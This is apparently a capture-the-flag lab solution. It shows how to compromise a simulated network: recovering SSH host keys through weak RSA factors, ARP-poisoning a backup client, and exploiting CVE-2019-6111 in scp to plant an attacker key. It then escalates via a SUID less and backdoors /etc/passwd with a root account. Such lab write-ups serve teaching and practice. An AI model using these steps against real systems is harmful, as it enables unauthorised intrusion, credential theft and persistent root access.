# Solution

**NOTE**: This solution was tested on Kali Linux 2020.3. The machine was attached to the "LAN" Internal network

## Network scan

First, scan the network with `nmap`:

```shell
  $ nmap 192.168.10.4/16
```

We see that all machines have SSH enabled. The only other services running appear to be web servers and a database server.

Looking at the network traffic with `wireshark`, we observe that one of the machines performs an ssh connection to the other machines automatically every 5-10 minutes. This is the backup machine transferring data over scp. The backup server connection is rather interesting, because if we spoof one of the other machines and set up an SSH honeypot, there is a possibility that we can obtain credentials for access to the machines. However, when spoofing an SSH server, we must fool the SSH client that we are the legitimate server, i.e. that we have the same public key as the server. If we do not have it, the SSH client will produce and error message stating that the identity of the server has changed. The only option is to somehow obtain a SSH host private key of one of the other machines. We can try to scan for weak RSA keys.

## Weak RSA keys

We get the public RSA SSH keys of the servers with `ssh-keyscan`:

```bash
for SSH_SERVER_IP in 192.168.10.{4,5,6} 192.168.20.{2,3}; do
  ssh-keyscan -t rsa $SSH_SERVER_IP | sed 's/^.*\(ssh-rsa.*\)/\1/' > "$SSH_SERVER_IP.pub"
done
```

Using a tool like [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool), we try to attack the public keys to recover the private keys. Installation is a bit tedious, but it is worth it.

To use the SSH host keys with the tool, we must first convert them from OpenSSH format to PEM format:

```bash
mkdir -p RsaCtfTool/temp
for file in *.pub; do
  ssh-keygen -f "$file" -e -m pem > "RsaCtfTool/temp/${file%.pub}.pem"
done
```

We then use the tool:

```shell
  $ cd RsaCtfTool
  $ python3 RsaCtfTool.py --publickey "temp/*.pem" --private
```

The tool successfully retrieves the private keys of two machines using 
the common factor attack. One of the keys is for the backup machine and the
other is for the CA machine.

We cannot decrypt captured traffic due to SSH's security properties, but we can now impersonate one of the servers that the backup machine is trying to connect to.

## SSH Honeypot

We can first set up a honeypot to see what commands are being executed over SSH.
[Cowrie](https://github.com/cowrie/cowrie) is a very capable honeypot.

We have to configure cowrie. We copy the CA private key from the output of `RsaCtfTool` and
paste it into `cowrie/var/lib/cowrie/ssh_host_rsa_key`. 
We copy the public key we obtained from the server to `cowrie/var/lib/cowrie/ssh_host_rsa_key.pub`

Then make changes to the configuration file `cowrie/etc/cowrie.cfg.dist` at the following lines(so that it's guaranteed that the user will authenticate and start executing commands, and that the server will listen on all local IPs):

```bash
out_addr = 0.0.0.0
listen_endpoints = tcp:22:interface=0.0.0.0
auth_none_enabled = true
```

We can start cowrie and start monitoring the log. (Note that in order to run on port 22, cowrie must be ran as a superuser, or *preferably* set `sudo setcap 'cap_net_bind_service=+ep' bin/cowrie`)

```shell
  $ bin/cowrie start
  $ tail -f var/log/cowrie/cowrie.log
```

### IP spoofing

We must spoof our IP to force the backup machine to connect to the honeypot.
Since we are going to be spoofing the CA server, we should not force assign this IP to us for the whole network, as other services connect to the CA server and we wouldn't want to interrupt them, since that can make our intrusion obvious.

Instead, we perform ARP poisoning on only the target machine(the backup machine),
pointing the IP of the other machine to our MAC address.
A sample solution script is available in [ip_spoof.py](./solution/ip_spoof.py). We run this script in another terminal window(must be ran as superuser):

```shell
  $ # python3 ip_spoof.py TARGET_IP SPOOF_IP INTERFACE
  $ # python3 ip_spoof.py $BACKUP_SERVER_IP $CA_SERVER_IP INTERFACE
  $ sudo python3 ip_spoof.py 192.168.10.6 192.168.10.5 eth0
```

## SCP Fun

Waiting a bit, we see that an ssh session flies into our honeypot. The user `backupper`
attempts to execute `scp` commands. It also appears that the version of
the client is `OpenSSH_7.6p1`. Out of the scp commands, one is particularly interesting:

```shell
  $ scp -f .ssh/id_rsa.pub
```

This command sends the file id_rsa.pub (most likely a public key) from the user's `.ssh` folder to the remote(backup) machine over an ssh connection. It is even possible, that this file is then placed in the `.ssh` folder on the backup machine, i.e. the remote command may be

```shell
  $ scp backupper@ca:.ssh/id_rsa.pub ~/.ssh/
```

Looking through the CVEs for OpenSSH v7.6p1, we find [CVE-2019-611](https://nvd.nist.gov/vuln/detail/CVE-2019-6111) - an issue where the received filenames are not checked against the requested filenames, making overwriting of files in the local directory possible if the server is malicious. This use case is very relevant to us - if the command executed is truly what we guessed above, we can overwrite `authorized_keys` in the `.ssh` directory with our own key, enabling us to ssh into the backup machine, so we will try to do just that.

After following one of the links on the CVE page, we quickly find an exploit for this vulnerability is available - [https://www.exploit-db.com/exploits/46193](https://www.exploit-db.com/exploits/46193). We must modify it to do the following:

  1. Accept login as any username without any authentication
  2. Make the first command sent be `C0664 {} id_rsa.pub\n`, to transfer the "right" file
  3. Make the second command be `C0664 {} authorized_keys\n`, to transfer our public key
  4. Make the server bind to any local address(`0.0.0.0`) and port `22`
  5. Make the server run the private key we extracted earlier

The modified version of the exploit can be found in [scp_CVE_2019_6111.py](./solution/scp_CVE_2019_6111.py).

We generate a pair of SSH keys with `ssh_keygen`. When prompted, we store them in files with prefix `pwner`. Then, we ran the [scp_CVE_2019_6111.py](./solution/scp_CVE_2019_6111.py) as follows(cowrie must be stopped beforehand, `bin/cowrie stop`):

```shell
  $ # python3 scp_CVE_2019_6111.py SERVER_PRIVATE_KEY_FILE AUTHORIZED_KEYS_FILE LISTENING_PORT
  $ sudo python3 scp_CVE_2019_6111.py cowrie/var/lib/cowrie/ssh_host_rsa_key ./pwner.pub 22
```

Then we wait for the next backup window. After patiently waiting, we get a connection logged from our script and the files are transferred successfully and `authorized_keys` has been overwritten.

We then attempt login by running:

```shell
  $ ssh -i ./pwner backupper@192.168.10.6
```

And we are through!
We are then able to obtain `backupper`'s private keys form the `.ssh` folder which are used to connect to other machines. 

Everything is fine and we are able to connect to all of the machines. There is only one small problem - if we check the output of `id`, we see that we are not running as a privileged user, nor do we know the password to the `backupper` or `root` account.

## Privilege escalation

We will try the 101 in privilege escalation - using programs which have their SUID bit set, i.e. the program operates with root privileges, no matter which user calls it. We scan the system for such programs:

```shell
  $ find / -perm -u=s -type f 2>/dev/null
```

An unusual entry appears in the list - `/bin/less`. The least we can do is read `/etc/passwd` and `/etc/shadow` and attempt to crack the password with a tool like [HashCat](https://hashcat.net/hashcat/). However, there is a way much faster solution...

Less is an interactive program. Checking `man less` reveals that if we enter `!` in the interactive prompt to spawn a shell. The shell that is spawned is the same one as the `SHELL` environmental variable.

If we try that, it doesn't really work - checking the output of `id`, everything's still the same - the `euid` nor the `uid` are set to `0`(root).

Checking the default shell with `echo $SHELL` reveals that the shell we are running in is `bash`. Unfortunately, bash does not allow the `uid` and `euid` to be different([as described in https://unix.stackexchange.com/a/391319](https://unix.stackexchange.com/a/391319)). Fortunately, there are other shells available on the system - `cat /etc/shells` yields a nice candidate - `/bin/dash`.

Setting `SHELL` to `/bin/dash`, running less (i.e. `SHELL=/bin/dash less SOMEFILE`) and invoking `!`, grants us a root shell. Still, we don't have true root access - we're still unable to install packages with `apt`.

We can quickly fix that by dirty-generating a root user account:

1. We get a hashed password `badbadbad` for the password file with openssl

    ```shell
      $ openssl passwd -1 -salt NaCl badbadbad
    ```

2. We add a root new user account `badr00t` by `echo`ing to `/etc/passwd`:

    ```shell
      $ echo 'badr00t:$1$NaCl$MjO97wWxeHlHWFif/qJZf/:0:0:root:/root:/bin/bash' >> /etc/passwd
    ```

Then simply `su badr00t -` and entering `badbadbad` when prompted for a password. We are in full control of the system!

SSH to all the other machines using the keys from the backup machine and repeat this process(only for the web server the escalation is different - described in the solution to the simple backdoor) to get control of everything!
